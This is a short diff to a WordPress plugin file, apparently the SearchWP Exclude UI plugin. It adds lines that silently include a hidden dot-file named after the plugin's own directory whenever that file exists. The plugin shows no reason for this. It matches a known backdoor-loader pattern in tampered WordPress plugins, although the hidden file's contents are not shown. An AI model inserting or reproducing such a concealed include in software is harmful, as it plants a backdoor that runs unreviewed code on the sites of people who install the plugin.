@@ -80,6 +80,10 @@ function searchwp_excludeui_update_check(){
 
 add_action( 'admin_init', 'searchwp_excludeui_update_check' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPExcludeUI {
 
 	private $meta_key = '_searchwp_excluded';
